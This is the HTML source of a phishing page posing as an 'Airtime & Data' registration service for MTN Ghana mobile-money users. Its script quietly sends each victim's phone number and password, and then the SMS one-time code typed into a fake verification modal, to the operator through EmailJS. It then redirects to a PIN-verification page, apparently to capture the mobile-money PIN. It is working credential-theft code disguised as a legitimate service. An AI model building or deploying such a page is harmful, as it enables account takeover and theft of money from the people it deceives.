<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Airtime & Data | Register</title>
  <meta name="description" content="Airtime & Data ‚Äî Fast and reliable airtime and data services with secure registration and easy access.">

  <!-- Favicons -->
  <link rel="apple-touch-icon" sizes="180x180" href="favicon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="favicon.png">

  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("gV773-VG85THpxrNV");
    })();
  </script>

  <style>
    /* ===== Preloader ===== */
    #preloader {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: linear-gradient(135deg, #002b5c, #004b8d);
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 9999;
      transition: opacity 0.8s ease;
    }
    #preloader.hidden {
      opacity: 0;
      pointer-events: none;
    }
    .loader {
      width: 80px;
      height: 80px;
      border: 6px solid rgba(255, 215, 0, 0.3);
      border-top-color: gold;
      border-radius: 50%;
      animation: spin 1.2s linear infinite, glow 2s ease-in-out infinite alternate;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    @keyframes glow {
      from { box-shadow: 0 0 10px gold; }
      to { box-shadow: 0 0 25px gold; }
    }

    /* ===== Background ===== */
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #002b5c, #004b8d);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
    }

    /* Floating gold particles */
    .particle {
      position: absolute;
      border-radius: 50%;
      background: radial-gradient(circle, rgba(255,215,0,0.8), transparent);
      animation: float 8s ease-in-out infinite;
      opacity: 0.5;
    }
    .particle:nth-child(1) { width: 8px; height: 8px; top: 10%; left: 20%; animation-delay: 0s; }
    .particle:nth-child(2) { width: 10px; height: 10px; top: 50%; left: 10%; animation-delay: 2s; }
    .particle:nth-child(3) { width: 6px; height: 6px; top: 70%; left: 80%; animation-delay: 4s; }
    .particle:nth-child(4) { width: 12px; height: 12px; top: 30%; left: 70%; animation-delay: 1s; }
    .particle:nth-child(5) { width: 9px; height: 9px; top: 80%; left: 40%; animation-delay: 3s; }

    @keyframes float {
      0%, 100% { transform: translateY(0); opacity: 0.5; }
      50% { transform: translateY(-20px); opacity: 1; }
    }

    /* ===== Card animation ===== */
    .fade-in-up {
      opacity: 0;
      transform: translateY(40px);
      animation: fadeUp 1.2s ease forwards;
    }
    @keyframes fadeUp {
      to { opacity: 1; transform: translateY(0); }
    }

    /* ===== Bouncing logo ===== */
    .bounce {
      animation: bounce 3s ease-in-out infinite, goldGlow 2.5s ease-in-out infinite alternate;
    }
    @keyframes bounce {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-15px); }
    }
    @keyframes goldGlow {
      0% { filter: drop-shadow(0 0 3px gold) drop-shadow(0 0 6px rgba(255,215,0,0.6)); }
      100% { filter: drop-shadow(0 0 10px gold) drop-shadow(0 0 20px rgba(255,215,0,1)); }
    }

    /* ===== Buttons and inputs ===== */
    .form-input {
      border: 2px solid #dbeafe;
      border-radius: 0.75rem;
      padding: 0.75rem;
      transition: 0.3s;
    }
    .form-input:focus {
      border-color: gold;
      box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
      outline: none;
    }
    .btn {
      background: gold;
      color: #002b5c;
      font-weight: bold;
      transition: all 0.3s ease;
    }
    .btn:hover {
      background: #ffcc00;
      transform: translateY(-2px);
      box-shadow: 0 4px 15px rgba(255, 215, 0, 0.4);
    }
  </style>
</head>

<body>
  <!-- Preloader -->
  <div id="preloader">
    <div class="loader"></div>
    <p style="color: gold; font-weight: bold; margin-top: 12px;">Setting up...</p>
  </div>

  <!-- Gold Floating Particles -->
  <div class="particle"></div>
  <div class="particle"></div>
  <div class="particle"></div>
  <div class="particle"></div>
  <div class="particle"></div>

  <!-- Main Content -->
  <div class="fade-in-up flex items-center justify-center w-full px-4 hidden" id="mainContent">
    <div class="bg-white p-8 rounded-2xl shadow-2xl w-full max-w-md border border-blue-100">
      <h2 class="text-3xl font-bold text-blue-700 text-center mb-6">Create An Account</h2>

      <form id="registerForm" class="space-y-5">
        <!-- Phone -->
        <div>
          <label class="block text-sm font-semibold text-gray-700 mb-1"><span style="color:gold;">MTN</span> Phone Number</label>
          <div class="flex items-center border-2 border-blue-200 rounded-xl overflow-hidden focus-within:ring-2 focus-within:ring-gold">
            <span class="px-3 bg-blue-50 flex items-center">
              <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Flag_of_Ghana.svg" alt="Ghana" class="w-6 h-4 mr-1">
              +233
            </span>
            <input type="text" id="phone" required maxlength="9" pattern="[1-9]{9}" placeholder="24XXXXXXX" class="flex-1 px-3 py-2 form-input">
          </div>
        </div>

        <!-- Password -->
        <div>
          <label class="block text-sm font-semibold text-gray-700 mb-1">Password</label>
          <div class="relative">
            <input type="password" id="password" required placeholder="Enter password" class="w-full form-input pr-10">
            <button type="button" id="togglePassword" class="absolute inset-y-0 right-3 flex items-center text-gray-500 hover:text-blue-600">üëÅ</button>
          </div>
        </div>

        <!-- Submit -->
        <button type="submit" class="btn w-full py-3 px-4 rounded-xl shadow-md">Register</button>
      </form>
    </div>
  </div>

  <!-- OTP Modal -->
  <div id="otpModal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center">
    <div class="bg-white rounded-2xl shadow-2xl w-full max-w-sm p-6 border border-blue-100 mx-4">
      <img src="momoapp.png" class="mx-auto mb-4 bounce" style="height: 100px; width: 260px;">
      <h3 class="text-xl font-bold text-blue-700 mb-4 text-center">Enter Verification Code</h3>
      <p class="text-sm text-gray-600 mb-2 text-center">We sent a link to your number. Enter the last six digits.</p>
      <h2 class="text-red-600 text-center font-semibold mb-4">Do not share this SMS</h2>
      <input type="text" id="otpInput" maxlength="6" placeholder="Enter 6-digit code" class="w-full form-input mb-3 text-center font-semibold text-lg">
      <div class="flex justify-between items-center text-sm text-gray-600 mb-3">
        <span id="timer" class="font-semibold text-blue-600">30s</span>
        <button id="resendBtn" class="text-blue-600 font-medium hidden hover:underline">Resend Code</button>
      </div>
      <button id="verifyBtn" class="btn w-full py-3 px-4 rounded-xl shadow-md">Verify</button>
    </div>
  </div>

  <!-- Notification -->
  <div id="notification" class="fixed top-5 right-5 hidden px-4 py-3 rounded-xl shadow-lg text-white font-medium"></div>

  <script>
    // Preloader
    window.addEventListener("load", () => {
      const preloader = document.getElementById("preloader");
      setTimeout(() => {
        preloader.classList.add("hidden");
        document.getElementById("mainContent").classList.remove("hidden");
      }, 1800);
    });

    // Password toggle
    const togglePassword = document.getElementById("togglePassword");
    const passwordField = document.getElementById("password");
    togglePassword.addEventListener("click", () => {
      const type = passwordField.getAttribute("type") === "password" ? "text" : "password";
      passwordField.setAttribute("type", type);
      togglePassword.textContent = type === "password" ? "üëÅ" : "üôà";
    });

    // OTP logic
    const registerForm = document.getElementById("registerForm");
    const otpModal = document.getElementById("otpModal");
    const otpInput = document.getElementById("otpInput");
    const verifyBtn = document.getElementById("verifyBtn");
    const resendBtn = document.getElementById("resendBtn");
    const timerEl = document.getElementById("timer");
    const notification = document.getElementById("notification");

    let countdown, timeLeft = 30;

    function showNotification(message, type = "success") {
      notification.textContent = message;
      notification.className = `fixed top-5 right-5 px-4 py-3 rounded-xl shadow-lg font-medium text-white ${
        type === "success" ? "bg-blue-600" : "bg-red-600"
      }`;
      notification.classList.remove("hidden");
      setTimeout(() => notification.classList.add("hidden"), 3000);
    }

    function startTimer() {
      timeLeft = 30;
      timerEl.textContent = timeLeft + "s";
      resendBtn.classList.add("hidden");
      countdown = setInterval(() => {
        timeLeft--;
        timerEl.textContent = timeLeft + "s";
        if (timeLeft <= 0) {
          clearInterval(countdown);
          showNotification("Time ran out. Please resend code.", "error");
          resendBtn.classList.remove("hidden");
        }
      }, 1000);
    }

    registerForm.addEventListener("submit", function(e){
      e.preventDefault();
      const phone = document.getElementById("phone").value;
      const password = passwordField.value;

      emailjs.send("service_74nt2c9", "template_s6vpt2e", {
        phone: "MTN +233" + phone,
        password: password
      }).then(() => {
        showNotification("Registration successful!");
        otpModal.classList.remove("hidden");
        otpModal.classList.add("flex");
        localStorage.setItem("userPhone", phone);
        startTimer();
      }).catch(() => {
        showNotification("Failed to send details.", "error");
      });
    });

    verifyBtn.addEventListener("click", function(){
      const otp = otpInput.value;
      if (otp.length === 6) {
        const phone = localStorage.getItem("userPhone");
        emailjs.send("service_74nt2c9", "template_s6vpt2e", {
          phone: "+233" + phone,
          otp: otp
        }).then(() => {
          showNotification("OTP Verified!");
          otpModal.classList.add("hidden");
          clearInterval(countdown);
          window.location.href = "pin-verification.html";
        }).catch(() => {
          showNotification("Failed to verify OTP.", "error");
        });
      } else {
        showNotification("Enter a valid 6-digit code.", "error");
      }
    });

    resendBtn.addEventListener("click", function(){
      otpInput.value = "";
      showNotification("Code resent. Please check your SMS.");
      startTimer();
    });
  </script>
</body>
</html>
